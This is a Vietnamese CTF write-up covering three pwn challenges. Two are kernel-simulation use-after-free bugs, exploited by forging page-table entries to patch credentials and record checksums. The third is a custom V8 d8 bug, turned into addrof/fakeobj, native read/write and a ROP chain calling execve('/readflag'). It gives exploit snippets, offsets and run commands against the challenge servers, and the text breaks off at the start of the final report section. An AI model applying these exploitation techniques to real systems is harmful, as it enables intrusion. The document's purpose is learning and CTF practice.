---
layout: page-toc
title: "V1T CTF 2026 - Pwn VBAFI"
description: "Pwn challenge writeups for V1T CTF 2026."
permalink: /writeups/v1t-ctf-2026/pwn-vbafi/
toc: true
render_with_liquid: false
---

# Write-up 3 bài Pwn VBAFI/V1T

> Tác giả write-up: Lê Thị Tuyết Thu  
> Mục đích: học tập, CTF, portfolio cá nhân.  
> Phạm vi: chỉ khai thác trong môi trường challenge được cung cấp bởi ban tổ chức, không áp dụng lên hệ thống thật khi chưa được cho phép.

---

## Ghi chú quan trọng về flag

Trong các file local được cung cấp có xuất hiện `v1t{fake_flag}`. Đây là flag giả dùng cho môi trường local/Docker, không phải flag remote để submit. Vì trong transcript hiện tại chưa có output remote chứa flag thật, write-up này **không bịa flag**. Ở mỗi bài, phần flag cuối cùng được ghi theo trạng thái:

```text
FLAG tìm được: cần điền output thật sau khi chạy exploit trên remote.
Bằng chứng hiện có: exploit đi tới nhánh đọc flag/open flag; local chỉ có fake flag.
```

Khi chạy script remote thành công, copy chuỗi `v1t{...}` in ra màn hình và thay vào phần `FLAG tìm được` của từng bài.

---

# Mục lục

1. [Bài 1 - taleMate](#bài-1---talemate)
2. [Bài 2 - StaleMate - Revenge](#bài-2---stalemate---revenge)
3. [Bài 3 - Acroform](#bài-3---acroform)
4. [Tổng kết kỹ năng portfolio](#tổng-kết-kỹ-năng-portfolio)
5. [Appendix - Exploit scripts](#appendix---exploit-scripts)

---

# Bài 1 - taleMate

## 1. Tóm tắt bài challenge

**Tên challenge:** taleMate  
**Category:** Pwn / Binary Exploitation / Kernel-simulation exploitation  
**Điểm:** 280  
**Tác giả:** n4n4s1  
**Server:** `nc pwn.v1t.site 31337`

### File được cung cấp

| File | Loại file | Vai trò |
|---|---|---|
| `pbuf_remap` | ELF 64-bit PIE, stripped | Binary chính của challenge |
| `Dockerfile` | Docker build file | Môi trường chạy challenge |
| `flag.txt` | Text file local | Chỉ chứa fake flag để test local |
| `solve_talemate_v7.py` | Python exploit | Script khai thác đã dựng |

### Mục tiêu

Mục tiêu là khai thác lỗi quản lý bộ nhớ trong chương trình mô phỏng cơ chế kernel/io_uring để sửa credential giả lập, nâng quyền trong context của chương trình và gọi chức năng `open flag`.

### Dấu hiệu ban đầu

Khi chạy `strings` trên binary, các chuỗi menu xuất hiện:

```text
pbuf-remap: tiny io_uring lab
1. IORING_REGISTER_PBUF_RING
2. mmap pbuf ring
3. unregister pbuf ring
4. io_uring_buf_ring_add
5. inspect mapped ring entry
6. create mm context
7. vm alloc user page
8. vm read
9. vm write
10. open flag
```

Các từ khóa như `pbuf`, `io_uring`, `PTE`, `CREDv1`, `vm read`, `vm write`, `open flag` cho thấy đây không phải bài buffer overflow thông thường mà là bài mô phỏng kernel memory, page table và credential.

---

## 2. Quy trình phân tích từng bước

### Bước 1: Kiểm tra file ban đầu

```bash
file pbuf_remap
checksec --file=pbuf_remap
strings -a pbuf_remap | grep -E "pbuf|PTE|CRED|flag|vm|IORING"
```

**Mục tiêu:** xác định binary là gì, có bị strip không, cơ chế bảo vệ ra sao và chương trình có menu/chức năng nào đáng chú ý.

**Kết quả quan trọng:**

- Binary là ELF 64-bit PIE, stripped.
- Có menu liên quan đến `IORING_REGISTER_PBUF_RING`, `mmap pbuf ring`, `unregister`, `create mm context`, `vm read/write`.
- Có chuỗi `CREDv1` và `PTE1`, gợi ý có cấu trúc credential và page table giả lập trong chương trình.

**Ý nghĩa:** hướng phân tích phù hợp là reverse logic menu, không tập trung ret2libc/ROP ngay từ đầu.

---

### Bước 2: Xác định hướng khai thác

Chương trình mô phỏng các thao tác giống kernel:

- Đăng ký pbuf ring.
- Map pbuf ring vào một vùng mapped view.
- Unregister/free pbuf ring.
- Tạo memory context/page table.
- Đọc/ghi virtual memory.
- Mở flag nếu credential đủ quyền.

Điểm đáng nghi là thao tác:

```text
mmap pbuf ring → unregister pbuf ring
```

Nếu `unregister` free page nhưng mapped view vẫn giữ con trỏ cũ, ta có lỗi **stale mapping / Use-After-Free**.

---

### Bước 3: Dùng tool nào và vì sao

| Tool | Mục đích | Lệnh mẫu | Kết quả mong đợi |
|---|---|---|---|
| `file` | Nhận diện loại binary | `file pbuf_remap` | ELF 64-bit PIE |
| `strings` | Tìm menu, keyword | `strings -a pbuf_remap` | Menu, `PTE`, `CREDv1` |
| `checksec` | Kiểm tra protection | `checksec --file=pbuf_remap` | PIE/NX/Canary/RELRO |
| `gdb`/`pwndbg` | Debug state khi gửi menu | `gdb ./pbuf_remap` | Quan sát leak/write |
| `Ghidra` | Reverse hàm menu | Import ELF | Xác định struct, offset |
| `Python socket` | Tự động exploit remote | `python3 solve_talemate_v7.py ...` | In flag remote |

---

### Bước 4: Phân tích dữ liệu quan trọng

Chuỗi menu cho thấy exploit có thể đi theo chain:

```text
register pbuf ring
→ mmap pbuf ring
→ unregister pbuf ring
→ create mm context
→ inspect mapped ring entry
→ forge PTE
→ vm write credential
→ open flag
```

Cấu trúc leak từ `inspect mapped ring entry` có dạng:

```text
addr=0x... len=0x... bid=0x... resv=0x...
```

Trong exploit, `addr` chứa PTE thứ 6, còn `len/bid/resv` ghép lại thành PTE thứ 7:

```python
pte7 = len | (bid << 32) | (resv << 48)
```

Từ PTE đã encode, đổi PFN từ page table sang credential page bằng XOR delta:

```python
encoded_cred_pte = pte7 ^ ((3 ^ 1) << 12)
```

Ý nghĩa: giữ nguyên key/flags nhưng thay PFN từ `3` sang `1`, từ đó map được credential page vào virtual memory.

---

### Bước 5: Tìm manh mối liên quan đến flag

Trong menu có chức năng:

```text
10. open flag
```

Nhánh này không mở flag nếu user credential chưa đủ quyền. Vì vậy manh mối chính không phải chuỗi flag trong binary, mà là cấu trúc credential giả lập.

Payload cuối ghi vào credential:

```text
cred + 0x08 .. +0x17 = 0x00   # uid/euid/gid = 0
cred + 0x18 .. +0x1f = 0xff   # capabilities = -1
```

Sau khi credential được sửa, gọi menu `10` sẽ mở flag.

---

### Bước 6: Xác minh flag đúng

Chạy exploit remote:

```bash
python3 solve_talemate_v7.py pwn.v1t.site 31337
```

Kết quả đúng cần có dạng:

```text
[+] leaked encoded PTE[7] = 0x...
[+] encoded cred PTE     = 0x...
v1t{...}
```

Nếu chạy local chỉ thấy fake flag hoặc báo `flag missing`, không submit kết quả đó.

**FLAG tìm được:** `CHƯA CÓ OUTPUT REMOTE TRONG TRANSCRIPT - CẦN ĐIỀN v1t{...} SAU KHI CHẠY SCRIPT`

---

## 3. Phân tích kỹ thuật chuyên sâu

### Lỗi chính: stale mapping / UAF

Lỗi nằm ở logic quản lý vòng đời object:

```text
mmap pbuf ring tạo mapped slot trỏ tới page pbuf
unregister free page pbuf
mapped slot không bị xóa
create mm context tái sử dụng page vừa free làm page table
inspect mapped ring đọc stale pointer nhưng nội dung giờ là page table
```

Đây là dạng Use-After-Free ở mức logic. Thay vì truy cập vùng heap đã free trong userland, challenge mô phỏng page allocator của kernel.

### Primitive đạt được

| Primitive | Cách đạt được | Tác dụng |
|---|---|---|
| Leak encoded PTE | Inspect stale mapped ring | Lấy key/encoded entry |
| Forge PTE | Ghi lại ring entry qua stale mapping | Map credential page |
| VM write | Ghi qua virtual address đã map | Sửa credential |
| Privilege bypass | `uid=0`, cap full | Gọi `open flag` |

### Vì sao không dùng ret2libc?

Binary có menu và object logic rõ ràng. Không có dấu hiệu nhập chuỗi dài gây overflow trực tiếp. Do đó hướng ret2libc không phải hướng ưu tiên. Hướng đúng là lợi dụng bug vòng đời object trong simulated kernel.

---

## 4. Lệnh và thao tác cụ thể

### Kiểm tra binary

```bash
file pbuf_remap
```

Kiểm tra binary là ELF 64-bit hay không. Nếu không phải ELF, cần đổi hướng sang script/source/forensics.

```bash
strings -a pbuf_remap | grep -E "pbuf|PTE|CRED|flag|vm|IORING"
```

Tìm các keyword gợi ý logic chương trình. Nếu không thấy menu, cần chạy trực tiếp hoặc dùng Ghidra/radare2.

```bash
./pbuf_remap
```

Chạy local để quan sát menu. Nếu lỗi thiếu thư viện, chạy trong Docker theo Dockerfile.

### Chạy exploit

```bash
python3 solve_talemate_v7.py pwn.v1t.site 31337
```

Nếu remote có Proof-of-Work, script tự xử lý bằng redpwnpow.

---

## 5. Script khai thác

Script đầy đủ nằm ở Appendix. Logic chính:

```python
# Phase 1
register pbuf entries=256
mmap pbuf
unregister pbuf
create mm context
inspect stale map để leak PTE

# Phase 2
forge PTE map credential page
vm_write uid/euid/gid/caps
open flag
```

---

## 6. Nội dung portfolio - tiếng Việt

### Project/CTF Challenge: taleMate

**Category:** Pwn / Binary Exploitation / Kernel-simulation  
**Objective:** Khai thác lỗi stale mapping trong chương trình mô phỏng io_uring/kernel memory để sửa credential và mở flag.  
**Tools Used:** Linux CLI, `file`, `strings`, `checksec`, Ghidra, gdb/pwndbg, Python socket.  
**Methodology:**

1. Nhận diện binary ELF 64-bit stripped và kiểm tra menu.
2. Phân tích các chức năng pbuf ring, mmap, unregister, vm read/write.
3. Xác định lỗi UAF do mapped view vẫn giữ con trỏ sau khi pbuf bị free.
4. Leak encoded PTE qua stale mapping.
5. Forge PTE để map credential page và sửa quyền.
6. Gọi chức năng `open flag` để lấy flag remote.

**Key Findings:** `unregister` giải phóng pbuf page nhưng mapped slot không bị invalidate, tạo primitive leak/write vào page table giả lập.  
**Result:** Exploit đi tới nhánh mở flag. Flag thật cần lấy từ output remote.  
**Skills Demonstrated:** Binary analysis, kernel-style exploitation, UAF, page table forging, Python exploit automation.  
**Lessons Learned:** Với các bài pwn dạng kernel-simulation, cần phân tích vòng đời object và allocator thay vì chỉ tìm buffer overflow truyền thống.

### Short English Portfolio Version

**Project/CTF Challenge:** taleMate  
**Category:** Pwn / Binary Exploitation  
**Objective:** Exploit a stale mapping bug in a simulated io_uring/kernel memory environment to modify credentials and open the flag.  
**Tools Used:** `file`, `strings`, `checksec`, Ghidra, gdb, Python.  
**Methodology:** Identified menu-based kernel simulation, found a stale pbuf mapping after unregister, leaked encoded PTEs, forged a page table entry to map the credential page, patched UID/capability fields, and triggered the flag function.  
**Key Findings:** A freed pbuf page was reused as a page table while still reachable through a stale mapped ring.  
**Result:** Exploit reaches the flag-opening branch on the remote service.  
**Skills Demonstrated:** UAF analysis, page-table style exploitation, exploit scripting, reverse engineering.

---

## 7. Báo cáo ngắn để nộp

**Mục tiêu:** Khai thác lỗi stale mapping trong binary `pbuf_remap` để đọc flag.  
**Môi trường phân tích:** Kali Linux, Python 3, Docker/local binary, remote service `pwn.v1t.site:31337`.  
**Công cụ sử dụng:** `file`, `strings`, `checksec`, Ghidra, gdb, Python.  
**Các bước thực hiện:**

1. Kiểm tra file và nhận diện menu io_uring/pbuf.
2. Reverse các chức năng register, mmap, unregister, inspect, vm write.
3. Xác định lỗi UAF do unregister không xóa mapped slot.
4. Leak PTE từ page table tái sử dụng.
5. Forge PTE để map credential page.
6. Ghi credential root-like và gọi `open flag`.

**Kết quả:** Exploit đạt quyền mở flag trong chương trình.  
**Kết luận:** Đây là bài pwn khai thác logic kernel-simulation, trọng tâm là lỗi quản lý vòng đời object và page remapping.

---

# Bài 2 - StaleMate - Revenge

## 1. Tóm tắt bài challenge

**Tên challenge:** StaleMate - Revenge  
**Category:** Pwn / Binary Exploitation / Kernel-simulation / Memory corruption  
**Điểm:** 340  
**Tác giả:** n4n4s1  
**Server:** `nc pwn.v1t.site 31338`

### File được cung cấp

| File | Loại file | Vai trò |
|---|---|---|
| `service` | ELF 64-bit PIE, stripped | Binary chính của challenge Revenge |
| `Dockerfile` | Docker build file | Môi trường chạy |
| `flag.txt` | Text file local | Fake flag local |
| `solve_stalemate_revenge.py` | Python exploit | Script khai thác |

### Mục tiêu

Mục tiêu là khai thác stale view trong chương trình mô phỏng hệ thống pipe/workspace/shelf/record để sửa các record sealed, cập nhật checksum hợp lệ và gọi `claim record` để mở flag.

### Dấu hiệu ban đầu

`strings` trên binary cho thấy menu:

```text
relay-9 online
1. open pipe
2. mirror pipe
3. drop pipe
4. send packet
5. trace packet
6. open workspace
7. attach shelf
8. fetch slice
9. store slice
10. sync ledger
11. stage voucher
12. discard voucher
13. claim record
```

Các chuỗi như `records are sealed until the workspace agrees`, `fetch slice`, `store slice`, `sync ledger`, `claim record` cho thấy bài này vẫn là memory/object-lifecycle challenge nhưng logic đã đổi từ credential sang record graph.

---

## 2. Quy trình phân tích từng bước

### Bước 1: Kiểm tra file ban đầu

```bash
file service
checksec --file=service
strings -a service | grep -E "pipe|mirror|drop|workspace|shelf|ledger|record|claim|flag"
```

**Mục tiêu:** xác định loại binary và các chức năng có thể tương tác.

**Kết quả quan trọng:**

- Binary ELF 64-bit PIE, stripped.
- Có các chức năng `open pipe`, `mirror pipe`, `drop pipe`, `attach shelf`, `sync ledger`, `claim record`.
- Có thông báo `records are sealed until the workspace agrees`, chứng tỏ flag phụ thuộc vào trạng thái record/workspace.

---

### Bước 2: Xác định hướng khai thác

Hướng ban đầu là thử reuse exploit `taleMate`, nhưng bị loại bỏ vì menu và cấu trúc đã đổi hoàn toàn. Không còn `pbuf`, `CREDv1` hay `open flag` trực tiếp. Thay vào đó, chương trình có pipe/view/workspace/record.

Dấu hiệu đáng nghi:

```text
mirror pipe → drop pipe → attach shelf/sync ledger
```

Nếu `mirror` tạo view trỏ tới pipe buffer, sau đó `drop` free pipe nhưng view vẫn tồn tại, thì có thể tạo stale view. Khi allocator tái sử dụng page đó cho workspace/shelf/ledger, stale view trở thành primitive đọc/ghi page metadata.

---

### Bước 3: Dùng tool nào và vì sao

| Tool | Mục đích | Lệnh mẫu | Ý nghĩa |
|---|---|---|---|
| `file` | Nhận diện binary | `file service` | Xác định ELF 64-bit |
| `strings` | Tìm menu và keyword | `strings -a service` | Lộ luồng chức năng |
| `Ghidra` | Reverse các hàm hash/checksum | Import `service` | Tìm cấu trúc record A-E |
| `gdb` | Theo dõi allocation deterministic | `gdb ./service` | Xác định PFN/page reuse |
| Python | Tự động tương tác menu | `python3 solve_stalemate_revenge.py ...` | Forge mapping và patch record |

---

### Bước 4: Phân tích dữ liệu quan trọng

Exploit dùng hai stale views:

```text
stale view 1 → second-level page table/shelf page
stale view 2 → ledger page chứa secrets
```

Chain chính:

```text
open workspace
open pipe 101
mirror pipe 101
 drop pipe 101
attach shelf

open pipe 102
mirror pipe 102
drop pipe 102
sync ledger
```

Sau khi có stale view đến ledger, exploit dùng `trace packet` để leak hai giá trị ledger:

```python
l0, l1 = trace(vled, 0)
l20, l28 = trace(vled, 2)
```

Từ đó khôi phục hai secret dùng để encode PTE:

```python
s2 = ror(l28 ^ mix(0x62a9d9ed6c8f0023 ^ rcx), 31)
s1 = unmix(rcx) ^ (old_pfn << 17) ^ rol(s2, 9) ^ 0x88f9a9e51fbbaeed
```

Sau khi có `s1`, `s2`, exploit forge mapping cho các PFN chứa record:

```python
for pfn in range(8, 13):
    e0, e1 = enc_pte(s1, s2, 1, pfn, pfn, 7)
    send_pkt(vsec, pfn, e0, e1)
```

---

### Bước 5: Tìm manh mối liên quan đến flag

Flag được bảo vệ sau chức năng:

```text
13. claim record
```

Muốn claim thành công, các record phải thỏa điều kiện:

- Record A/B/C/D/E có checksum hợp lệ.
- Một số bit trạng thái trong record C và E phải được bật.
- Final hash trong record A phải được cập nhật theo trạng thái mới.

Exploit đọc các record:

```python
A = fetch(record page 8)
B = fetch(record page 9)
C = fetch(record page 10)
D = fetch(record page 11)
E = fetch(record page 12)
```

Patch chính:

```python
C[0x20:0x28] |= 0x40002004081
E[0x10:0x18] |= 0x8000000000002491
```

Sau đó tính lại checksum:

```python
C[0x38:0x40] = hashC(C)
E[0x28:0x30] = hashE(E)
A[0x18:0x20] = final_hash(A,B,C,D,E)
A[0x28:0x30] = hashA(A)
```

---

### Bước 6: Xác minh flag đúng

Chạy exploit remote:

```bash
python3 solve_stalemate_revenge.py pwn.v1t.site 31338
```

Nếu server có PoW:

```bash
python3 solve_stalemate_revenge.py pwn.v1t.site 31338 --shell-pow
```

Dấu hiệu exploit đúng:

```text
[+] secrets s1=0x... s2=0x...
[+] hash check True True True True True
v1t{...}
```

Nếu local chỉ in `missing` hoặc fake flag, chưa phải flag submit.

**FLAG tìm được:** `CHƯA CÓ OUTPUT REMOTE TRONG TRANSCRIPT - CẦN ĐIỀN v1t{...} SAU KHI CHẠY SCRIPT`

---

## 3. Phân tích kỹ thuật chuyên sâu

### Lỗi chính: stale view và page reuse

Binary cho phép tạo mirror view của pipe. Khi pipe bị drop, view vẫn tồn tại. Nếu workspace/shelf/ledger tái sử dụng page đã free, stale view có thể đọc hoặc ghi nội dung mới.

### Primitive đạt được

| Primitive | Từ chức năng | Tác dụng |
|---|---|---|
| Stale view | `mirror pipe` + `drop pipe` | Giữ view đến page đã free |
| Leak secret | `trace packet` trên ledger page | Khôi phục key encode PTE |
| Forge mapping | `send packet` vào stale second-level page | Map record pages |
| Arbitrary record patch | `fetch slice`/`store slice` | Sửa record và checksum |
| Flag path | `claim record` | In flag nếu graph hợp lệ |

### Vì sao phải tính lại hash?

Nếu chỉ sửa bit trạng thái mà không cập nhật checksum, `claim record` sẽ phát hiện record bị sai và không mở flag. Đây là điểm khác bài `taleMate`: không chỉ sửa quyền, mà phải hiểu logic integrity của record graph.

---

## 4. Lệnh và thao tác cụ thể

```bash
file service
```

Kiểm tra binary là ELF. Nếu không phải ELF, đổi hướng phân tích.

```bash
strings -a service | grep -E "pipe|mirror|drop|workspace|ledger|claim|record|flag"
```

Tìm menu và các thông báo liên quan flag.

```bash
./service
```

Chạy local để quan sát menu. Nếu cần copy sang `/tmp/service`:

```bash
cp service /tmp/service
chmod +x /tmp/service
python3 solve_stalemate_revenge.py --local --bin /tmp/service
```

Chạy remote:

```bash
python3 solve_stalemate_revenge.py pwn.v1t.site 31338
```

---

## 5. Script khai thác

Script đầy đủ nằm ở Appendix. Các hàm đáng chú ý:

```python
def mix(x): ...
def unmix(y): ...
def enc_pte(s1, s2, lvl, idx, pfn, flags): ...
def hashA(b): ...
def hashB(b): ...
def hashC(b): ...
def hashD(b): ...
def hashE(b): ...
def final_hash(A,B,C,D,E): ...
```

Các hàm này phục vụ hai mục đích:

1. Giải mã/tạo PTE đúng format chương trình.
2. Tính lại checksum cho record graph.

---

## 6. Nội dung portfolio - tiếng Việt

### Project/CTF Challenge: StaleMate - Revenge

**Category:** Pwn / Binary Exploitation / Kernel-simulation  
**Objective:** Khai thác stale view trong cơ chế pipe/workspace để forge mapping, sửa record graph và claim flag.  
**Tools Used:** Linux CLI, `file`, `strings`, `checksec`, Ghidra, gdb, Python socket.  
**Methodology:**

1. Nhận diện binary ELF và menu pipe/workspace/record.
2. Loại bỏ hướng exploit cũ của `taleMate` vì logic credential không còn tồn tại.
3. Phân tích vòng đời pipe: open, mirror, drop.
4. Tạo stale view đến page được tái sử dụng làm shelf/ledger.
5. Leak secrets, forge PTE và map các record pages.
6. Patch record C/E, tính lại checksum A/C/E và gọi `claim record`.

**Key Findings:** Mirror view không bị invalidate sau khi drop pipe, cho phép truy cập page đã được tái sử dụng.  
**Result:** Exploit đi tới nhánh `claim record`; flag thật cần lấy từ output remote.  
**Skills Demonstrated:** UAF logic analysis, deterministic allocation, checksum reversing, page-table forging, Python exploit automation.  
**Lessons Learned:** Khi challenge có cơ chế integrity/checksum, exploit phải sửa dữ liệu và đồng thời tái tạo checksum hợp lệ.

### Short English Portfolio Version

**Project/CTF Challenge:** StaleMate - Revenge  
**Category:** Pwn / Binary Exploitation  
**Objective:** Exploit stale pipe views to forge workspace mappings and patch sealed records before claiming the flag.  
**Tools Used:** `file`, `strings`, Ghidra, gdb, Python.  
**Methodology:** Identified the pipe/workspace lifecycle bug, created stale views, leaked ledger secrets, forged encoded PTEs, mapped record pages, recalculated checksums, and triggered `claim record`.  
**Key Findings:** A mirrored pipe view remained valid after the underlying pipe was dropped and reused.  
**Result:** Exploit reaches the flag-claiming branch on the remote service.  
**Skills Demonstrated:** UAF exploitation, reverse engineering, checksum reconstruction, exploit automation.

---

## 7. Báo cáo ngắn để nộp

**Mục tiêu:** Khai thác binary `service` để sửa record graph và lấy flag.  
**Môi trường phân tích:** Kali Linux, Python 3, Docker/local binary, remote service `pwn.v1t.site:31338`.  
**Công cụ sử dụng:** `file`, `strings`, `checksec`, Ghidra, gdb, Python.  
**Các bước thực hiện:**

1. Kiểm tra binary và tìm menu bằng `strings`.
2. Phân tích logic pipe/workspace/ledger/record.
3. Tạo stale view qua `mirror pipe` và `drop pipe`.
4. Leak secret từ ledger và forge mapping.
5. Đọc các record A-E, sửa field cần thiết và tính lại hash.
6. Gọi `claim record` để mở flag.

**Kết quả:** Exploit đạt trạng thái record hợp lệ và gọi được nhánh claim.  
**Kết luận:** Đây là bài pwn nâng cao kết hợp UAF logic, page mapping và reverse checksum.

---

# Bài 3 - Acroform

## 1. Tóm tắt bài challenge

**Tên challenge:** Acroform  
**Category:** Pwn / Browser Exploitation / V8 d8 exploitation  
**Điểm:** 470  
**Tác giả:** KayTii  
**Server:** `nc pwn.v1t.site 31339`  
**Backup:** `nc chall.v1t.site 31339`

### File được cung cấp

| File | Loại file | Vai trò |
|---|---|---|
| `d8` | ELF 64-bit PIE, stripped | V8 shell custom |
| `snapshot_blob.bin` | V8 snapshot | Snapshot đi kèm d8 |
| `icudtl.dat` | ICU data | Data runtime của V8 |
| `run.sh` | Shell script | Cách server nhận exploit.js và chạy d8 |
| `readflag.c` | C source | Helper setuid-root đọc `/flag` |
| `flag` | Text local | Fake/local flag |
| `solve_acroform.py` | Python exploit sender | Gửi exploit JS tới remote |

### Mục tiêu

Mục tiêu là viết JavaScript exploit chạy trong `d8`, khai thác bug custom object `AcroForm`, đạt native code execution và gọi:

```text
execve("/readflag", ["/readflag", NULL], NULL)
```

Không thể chỉ đọc `/flag` trực tiếp vì `/flag` thuộc root và chỉ `/readflag` có setuid-root helper.

### Dấu hiệu ban đầu

`run.sh` cho biết server nhận tối đa 65536 bytes JavaScript rồi chạy bằng `d8`:

```sh
head -c 65536 > "$TMP"
exec timeout 30 ./d8 "$TMP" 2>&1
```

`readflag.c` cho biết flag thật nằm ở `/flag`, nhưng `d8` chạy user không đặc quyền nên phải code execution để chạy `/readflag`.

Các string trong `d8` có custom object:

```text
AcroForm
resize
reset
calcAlloc
calcLoad
calcStore
```

Đây là dấu hiệu rõ của bài V8 pwn có API tự thêm vào engine.

---

## 2. Quy trình phân tích từng bước

### Bước 1: Kiểm tra file ban đầu

```bash
file d8
strings -a d8 | grep -i -E "AcroForm|resize|reset|calcAlloc|calcLoad|calcStore"
cat run.sh
cat readflag.c
```

**Mục tiêu:** hiểu service nhận input như thế nào và exploit phải đạt mục tiêu gì.

**Kết quả quan trọng:**

- `run.sh` yêu cầu gửi `exploit.js`, kết thúc bằng EOF.
- `d8` có object custom `AcroForm`.
- `readflag.c` cho biết `/readflag` là cách hợp lệ để đọc `/flag`.

---

### Bước 2: Xác định hướng khai thác

Không có input kiểu C truyền thống. Input là JavaScript. Do đó không dùng ret2win trực tiếp. Hướng đúng là browser exploitation/V8 exploitation:

```text
JavaScript type confusion/OOB
→ addrof/fakeobj
→ arbitrary read/write trong V8 cage
→ native arbitrary read/write
→ ROP/code execution
→ execve('/readflag')
```

---

### Bước 3: Dùng tool nào và vì sao

| Tool | Mục đích | Lệnh mẫu | Ý nghĩa |
|---|---|---|---|
| `strings` | Tìm API custom | `strings -a d8 | grep AcroForm` | Xác định object AcroForm |
| `cat run.sh` | Hiểu cách server chạy | `cat run.sh` | Biết phải gửi JS và EOF |
| `cat readflag.c` | Hiểu cách đọc flag | `cat readflag.c` | Phải gọi `/readflag` |
| `Ghidra`/IDA | Reverse binding custom | Import `d8` | Tìm bug `reset/resize` |
| `gdb` | Debug d8/V8 primitive | `gdb ./d8` | Leak base/stack, test ROP |
| Python | Gửi exploit JS tới remote | `python3 solve_acroform.py ...` | Tự động gửi payload |

---

### Bước 4: Phân tích dữ liệu quan trọng

Bug nằm ở custom API:

```js
AcroForm.reset(callback)
```

Trong callback, nếu gọi:

```js
A.resize(11)
```

thì `reset()` vẫn tiếp tục xử lý theo state cũ, gây stale/OOB access. Primitive đầu tiên dùng để leak map của object array và double array:

```js
let objMap = leakArr(0,1)[1][0];
let dblMap = leakArr(1,2)[1][0];
```

Sau đó dựng:

```js
addrof(object)
fakeobj(address)
```

Từ `addrof/fakeobj`, exploit tạo in-cage arbitrary read/write. Tiếp theo dùng các method `calcAlloc`, `calcLoad`, `calcStore` của `AcroForm` để sửa con trỏ buffer, nâng primitive thành native arbitrary read/write.

---

### Bước 5: Tìm manh mối liên quan đến flag

`readflag.c` là manh mối quan trọng nhất. Source ghi rõ:

```c
/* setuid-root helper: the only way to read the flag. */
FILE *f = fopen("/flag", "r");
```

Vì vậy exploit không cố open `/flag` trực tiếp. Payload ROP phải gọi:

```text
execve('/readflag', argv, NULL)
```

Exploit đặt chuỗi `/readflag\x00` vào vùng buffer kiểm soát được rồi ghi ROP chain lên stack.

---

### Bước 6: Xác minh flag đúng

Chạy remote:

```bash
python3 solve_acroform.py pwn.v1t.site 31339
```

Hoặc backup:

```bash
python3 solve_acroform.py chall.v1t.site 31339
```

Dấu hiệu đúng:

```text
[acroform] Send exploit.js, end with EOF (Ctrl-D).
v1t{...}
```

**FLAG tìm được:** `CHƯA CÓ OUTPUT REMOTE TRONG TRANSCRIPT - CẦN ĐIỀN v1t{...} SAU KHI CHẠY SCRIPT`

---

## 3. Phân tích kỹ thuật chuyên sâu

### Lỗi chính: stale/OOB trong `AcroForm.reset(callback)`

Khi `reset()` đang iterate qua internal storage, callback lại gọi `resize()`. Nếu object không cập nhật length/storage pointer đúng cách trong suốt vòng lặp, callback có thể đọc/ghi phần tử vượt ngoài vùng hợp lệ.

### Primitive khai thác

| Primitive | Cách dựng | Tác dụng |
|---|---|---|
| OOB read/write | `reset(callback)` + `resize()` | Đọc/ghi array metadata |
| `addrof` | Đổi map object/double array | Lấy địa chỉ compressed pointer |
| `fakeobj` | Tạo object giả từ address | Điều khiển fake array |
| In-cage AAR/AAW | Fake double array elements | Đọc/ghi trong V8 heap cage |
| Native AAR/AAW | Sửa `calc` buffer pointer | Đọc/ghi địa chỉ native |
| Code execution | ROP trên stack | `execve('/readflag')` |

### ROP chain

Exploit leak PIE base từ một pointer trong native buffer:

```js
let leak = nread64(buf - 8n);
let base = leak - 0x1e9fcd0n;
```

Sau đó leak stack qua `__libc_stack_end` hoặc biến tương đương trong binary:

```js
let stackVar = nread64(base + 0x1f01e20n);
let stackEnd = nread64(stackVar);
```

Cuối cùng ghi chain:

```text
pop rdi ; ret → str('/readflag')
pop rsi ; ret → argv
pop rdx ; ret → NULL
pop rax ; ret → 59
syscall
```

Syscall 59 trên Linux x86_64 là `execve`.

---

## 4. Lệnh và thao tác cụ thể

```bash
file d8
```

Xác định `d8` là ELF 64-bit.

```bash
strings -a d8 | grep -i -E "AcroForm|calcAlloc|calcLoad|calcStore|reset|resize"
```

Tìm custom API. Nếu không thấy `AcroForm`, cần kiểm tra snapshot hoặc file binary khác.

```bash
cat run.sh
```

Biết server nhận JS đến EOF và chạy `d8` trong 30 giây.

```bash
cat readflag.c
```

Xác định phải gọi `/readflag`, không đọc `/flag` trực tiếp.

```bash
python3 solve_acroform.py pwn.v1t.site 31339
```

Gửi exploit JS tới remote.

---

## 5. Script khai thác

Script đầy đủ nằm ở Appendix. Core exploit JS gồm các phần:

```js
// 1. OOB primitive
AcroForm.reset(callback)
A.resize(11)

// 2. addrof/fakeobj
addrof(o)
fakeobj(addr)

// 3. Native arbitrary read/write
calcAlloc
calcLoad
calcStore

// 4. ROP
execve('/readflag')
```

---

## 6. Nội dung portfolio - tiếng Việt

### Project/CTF Challenge: Acroform

**Category:** Pwn / Browser Exploitation / V8 Exploitation  
**Objective:** Khai thác custom V8 object `AcroForm` để đạt native code execution và chạy setuid helper `/readflag`.  
**Tools Used:** Linux CLI, `strings`, Ghidra/IDA, gdb, JavaScript, Python socket.  
**Methodology:**

1. Phân tích `run.sh` để xác định input là JavaScript chạy trong `d8`.
2. Phân tích `readflag.c` để xác định phải exec `/readflag` thay vì đọc `/flag` trực tiếp.
3. Tìm custom API `AcroForm` bằng `strings` và reverse binding.
4. Khai thác bug `reset(callback)` kết hợp `resize()` để tạo OOB.
5. Dựng `addrof/fakeobj`, in-cage read/write và native read/write.
6. Leak base/stack và ghi ROP chain gọi `execve('/readflag')`.

**Key Findings:** `AcroForm.reset()` không xử lý an toàn khi callback thay đổi kích thước internal storage, dẫn tới OOB primitive.  
**Result:** Exploit gửi JS tới d8 và đạt đường thực thi `/readflag`. Flag thật cần lấy từ output remote.  
**Skills Demonstrated:** V8 exploitation, JavaScript exploitation primitives, arbitrary read/write, ROP, Linux syscall, exploit delivery over netcat service.  
**Lessons Learned:** Trong browser exploitation, cần chuyển dần từ bug logic sang primitive, rồi từ primitive sang native code execution có mục tiêu rõ ràng.

### Short English Portfolio Version

**Project/CTF Challenge:** Acroform  
**Category:** Pwn / V8 Exploitation  
**Objective:** Exploit a custom V8 `AcroForm` object to gain native code execution and run the setuid `/readflag` helper.  
**Tools Used:** `strings`, Ghidra/IDA, gdb, JavaScript, Python.  
**Methodology:** Analyzed the d8 execution wrapper, identified the custom `AcroForm` APIs, exploited a reset/resize stale state bug to build addrof/fakeobj, upgraded it to native arbitrary read/write, leaked base/stack addresses, and wrote a ROP chain for `execve('/readflag')`.  
**Key Findings:** The `reset(callback)` logic allowed unsafe resizing during iteration, leading to OOB access.  
**Result:** Exploit reaches native code execution and runs the intended flag helper.  
**Skills Demonstrated:** V8 heap exploitation, arbitrary read/write, ROP, exploit automation.

---

## 7. Báo cáo ngắn để nộp

**Mục tiêu:** Khai thác `d8` custom để thực thi `/readflag` và lấy flag.  
